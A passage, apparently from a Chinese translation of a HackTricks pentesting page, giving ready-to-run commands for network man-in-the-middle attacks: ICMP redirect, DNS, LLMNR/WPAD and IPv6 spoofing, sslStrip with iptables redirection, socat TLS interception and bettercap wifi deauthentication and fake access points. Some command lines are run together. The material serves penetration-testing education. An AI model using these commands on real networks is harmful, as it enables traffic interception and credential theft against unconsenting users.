yersinia dhcp -attack 2 #More parameters are needed
```
### ARP欺骗

查看[前一节](./#arp-spoofing)。

### ICMP重定向

ICMP重定向是指发送一种ICMP数据包，类型为1，代码为5，表明攻击者是到达某个IP地址的最佳路径。然后，当受害者想要联系该IP地址时，数据包会通过攻击者发送。
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS欺骗

攻击者将解析受害者请求的一些（或全部）域名。
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**使用dnsmasq配置自己的DNS**
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### 本地网关

通常存在到系统和网络的多条路由。在构建本地网络中的MAC地址列表后，使用 _gateway-finder.py_ 来识别支持IPv4转发的主机。
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [欺骗 LLMNR、NBT-NS 和 mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Microsoft 系统使用 Link-Local Multicast Name Resolution (LLMNR) 和 NetBIOS Name Service (NBT-NS) 来进行本地主机解析，当 DNS 查询失败时。Apple Bonjour 和 Linux 零配置实现使用 Multicast DNS (mDNS) 来发现网络中的系统。这些协议未经身份验证，通过 UDP 广播消息；因此，攻击者可以利用它们将用户引导到恶意服务。

您可以使用 Responder 模拟被主机搜索的服务，发送虚假响应。\
阅读有关[如何使用 Responder 模拟服务](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)的更多信息。

### [欺骗 WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

许多浏览器使用 Web Proxy Auto-Discovery (WPAD) 从网络加载代理设置。WPAD 服务器通过特定 URL（例如，[http://wpad.example.org/wpad.dat](http://wpad.example.org/wpad.dat)）提供客户端代理设置，当通过以下任一方式识别时：

- DHCP，使用代码 252 条目
- DNS，在本地域中搜索 _wpad_ 主机名
- Microsoft LLMNR 和 NBT-NS（在 DNS 查询失败时）

Responder 自动化了 WPAD 攻击 - 运行代理并通过 DHCP、DNS、LLMNR 和 NBT-NS 将客户端引导到恶意 WPAD 服务器。\
阅读有关[如何使用 Responder 模拟服务](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)的更多信息。

### [欺骗 SSDP 和 UPnP 设备](spoofing-ssdp-and-upnp-devices.md)

您可以在网络中提供不同的服务，试图**欺骗用户**输入一些**明文凭据**。有关此攻击的**更多信息**请参阅[**欺骗 SSDP 和 UPnP 设备**](spoofing-ssdp-and-upnp-devices.md)**。**

### IPv6 邻居欺骗

这种攻击与 ARP 欺骗非常相似，但在 IPv6 世界中。您可以让受害者认为网关的 IPv6 具有攻击者的 MAC 地址。
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6路由器通告欺骗/洪泛

一些操作系统默认配置为从网络中发送的RA数据包中获取网关。要将攻击者声明为IPv6路由器，您可以使用：
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCP欺骗

默认情况下，一些操作系统尝试通过读取网络中的DHCPv6数据包来配置DNS。然后，攻击者可以发送一个DHCPv6数据包来将自己配置为DNS。DHCP还会为受害者提供一个IPv6地址。
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP（伪造页面和JS代码注入）

## 互联网攻击

### sslStrip

基本上，这种攻击的作用是，如果**用户**试图**访问**一个**重定向到****HTTPS**版本的**HTTP**页面。**sslStrip**将会与**客户端保持**一个**HTTP连接**，与**服务器保持**一个**HTTPS连接**，这样它就能够以**明文**方式**嗅探**连接。
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
更多信息[在这里](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf)。

### sslStrip+和dns2proxy用于绕过HSTS

**sslStrip+和dns2proxy**与**sslStrip**的**区别**在于，它们会将例如_**www.facebook.com**_ **重定向到**_**wwww.facebook.com**_（注意**额外的**“**w**”），并将该域的**地址设置为攻击者IP**。这样，**客户端**将连接到_**wwww.facebook.com**_（攻击者），但在幕后**sslstrip+**将通过https与**www.facebook.com** **保持**真实连接。

这种技术的**目标**是**避开HSTS**，因为_**wwww**.facebook.com_ **不会**保存在浏览器的缓存中，因此浏览器将被欺骗在HTTP中执行**facebook身份验证**。\
请注意，为了执行此攻击，受害者必须尝试最初访问[http://www.faceook.com](http://www.faceook.com)而不是https。这可以通过修改http页面内的链接来完成。

更多信息[在这里](https://www.bettercap.org/legacy/#hsts-bypass)，[在这里](https://www.slideshare.net/Fatuo\_\_/offensive-exploiting-dns-servers-changes-blackhat-asia-2014)和[在这里](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly)。

**sslStrip或sslStrip+不再起作用。这是因为浏览器中预先保存了HSTS规则，因此即使用户第一次访问“重要”域，也会通过HTTPS访问。此外，请注意，预先保存的规则和其他生成的规则可以使用标志** [**`includeSubdomains`**](https://hstspreload.appspot.com) **因此，之前的** _**wwww.facebook.com**_ **示例将不再起作用，因为** _**facebook.com**_ **使用带有`includeSubdomains`的HSTS。**

待办事项：easy-creds、evilgrade、metasploit、factory

## 在端口上进行TCP监听
```
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## 在端口上进行 TCP + SSL 监听

#### 生成密钥和自签名证书
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### 使用证书进行监听
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### 使用证书监听并重定向到主机
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
有时，如果客户端检查CA是否有效，您可以**提供由CA签名的其他主机名的证书**。\
另一个有趣的测试是提供一个**请求主机名的证书，但是自签名的**。

其他要测试的事情包括尝试使用一个无效的证书对证书进行签名，或者使用有效的公钥，强制使用诸如迪菲-赫尔曼（不需要使用真实私钥解密任何内容的算法）这样的算法，并在客户端请求真实私钥的探测时（如哈希）发送一个虚假的探测，并期望客户端不会检查这一点。

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### 主动发现笔记

请注意，当向一个没有请求端口的设备发送UDP数据包时，会发送一个ICMP（端口不可达）。

### **ARP 发现**

ARP数据包用于发现网络内正在使用的IP地址。计算机必须为每个可能的IP地址发送一个请求，只有正在使用的IP地址才会响应。

### **mDNS（多播DNS）**

Bettercap发送一个MDNS请求（每X毫秒一次），请求 **\_services\_.dns-sd.\_udp.local**，看到这个数据包的机器通常会回应此请求。然后，它只搜索回应“services”的机器。

**工具**

* Avahi-browser（--all）
* Bettercap（net.probe.mdns）
* Responder

### **NBNS（NetBios名称服务器）**

Bettercap向端口137/UDP广播数据包，请求名称为“CKAAAAAAAAAAAAAAAAAAAAAAAAAAA”。

### **SSDP（简单服务发现协议）**

Bettercap广播SSDP数据包，搜索各种服务（UDP端口1900）。

### **WSD（Web服务发现）**

Bettercap广播WSD数据包，搜索服务（UDP端口3702）。

## 参考资料

* [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**漏洞赏金提示**：**注册**Intigriti，一个由黑客创建的高级**漏洞赏金平台**！立即加入我们，让您的赏金高达**$100,000**！[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在HackTricks中看到您的**公司广告**或**下载PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[NFTs](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**上关注**我们。
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
